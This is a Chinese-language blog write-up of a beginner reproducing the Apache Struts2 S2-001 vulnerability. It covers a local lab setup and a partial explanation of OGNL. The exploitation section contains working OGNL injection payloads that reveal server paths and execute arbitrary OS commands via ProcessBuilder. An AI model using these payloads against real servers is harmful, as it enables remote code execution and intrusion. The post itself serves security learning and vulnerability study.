# 前言
由于之前在校时面向对象语言学习的是C++，而后又学的是php和Python，从而完全没有涉及过java的领域，java安全这块的内容也一直没怎么涉及。看着师傅们在讨论java的漏洞利用时也无法参与。
于是想着，趁着暑假这最后还有一两个星期的时间，入门学习一下java安全。于是就挑了个struts2 S2-001来复现。
由于在java
web这块完全没有什么基础，导致踩了很多坑，有些小问题也卡壳卡了很久，最后总算还是艰难的完成了复现以及分析，接下来分享一下自己从零开始搭建环境，到分析漏洞的过程。
# 环境搭建
平台：win10
工具：
  * Apache Tomcat 9.0.7
  * IntelliJ IDEA
首先在IDEA中新建一个project
创建好后源码代码结构如下
接下来依此来搭建环境
首先先从
中下载struts2的jar包
然后将在`WEB-INF`目录中新建lib目录，将所需的五个包放入
然后修改web.xml内容为
        S2-001 Example
            struts2
            org.apache.struts2.dispatcher.FilterDispatcher
            struts2
            /*
            index.jsp
新建index.jsp和welcome.jsp内容如下
index.jsp
      S2-001
    S2-001 Demo
    link: https://cwiki.apache.org/confluence/display/WW/S2-001
welcome.jsp
        S2-001
    Hello 
然后在src中新建`com.demo.action`package
这时候src会突然找不到，只要点击一下上面的Project Files就能看到文件
然后新建一个`LoginAction.java`，内容如下
    package com.demo.action;
    import com.opensymphony.xwork2.ActionSupport;
    public class LoginAction extends ActionSupport {
        private String username = null;
        private String password = null;
        public String getUsername() {
            return this.username;
        }
        public String getPassword() {
            return this.password;
        }
        public void setUsername(String username) {
            this.username = username;
        }
        public void setPassword(String password) {
            this.password = password;
        }
        public String execute() throws Exception {
            if ((this.username.isEmpty()) || (this.password.isEmpty())) {
                return "error";
            }
            if ((this.username.equalsIgnoreCase("admin"))
                    && (this.password.equals("admin"))) {
                return "success";
            }
            return "error";
        }
    }
然后在src目录下新建struts.xml，内容如下
                welcome.jsp
                index.jsp
这时候会看到LoginAction会一直显示找不到要导入的`opensymphony.xwork2.ActionSupport`，是由于jar包还没有真正的被导入到这个项目中
点击`File->Project Structure`
然后找到刚才在lib目录下的jar包，点上勾之后点击OK即可
然后`Build->Build Project`build一下整个项目，刚才的包就被成功的导入到项目中，错误提示也就消失了
然后配置一下tomcat的debug configurations，就可以成功运行这个项目了
点击运行后，访问8888端口即可（默认为8080，我这更改了下），看到如下页面就表示环境搭建成功
# 漏洞利用
在登录失败的时候可以看到，会将错误的`username`和`password`显示在输入框中
然而当我们在密码框处输入这样一个字符串时`%{1+1}`（`%`需编码）会被解析成2
从而利用这一特性，可以构造一些命令执行语句
获取tomcat路径
    %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
获取web路径
    %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
以及命令执行
    %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
将其中的`java.lang.String[]{"whoami"}`修改一下就可以执行任意命令
# OGNL表达式
搬运
> OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression
> Language，简称为
> EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。
> OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)
>
> 1、表达式（Expression）
>
> 表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL
> 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department
> 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。
>
> 2、根对象（Root Object）
>
> 根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user
> 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的
> name 属性值）。
>
> 3、上下文环境（Context）
>
> 有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL
> 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL
> 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。  
>  OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root  
>  Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root  
>  Object）的存取操作的表达式是不需要增加 #符号进行区分的。
>
> 表达式功能操作清单：
>  
>  
>     1. 基本对象树的访问
>     对象树的访问就是通过使用点号将对象的引用串联起来进行。
>     例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx
>  
>     2. 对容器变量的访问
>     对容器变量的访问，通过#符号加上表达式进行。
>     例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx
>  
>     3. 使用操作符号
>     OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, =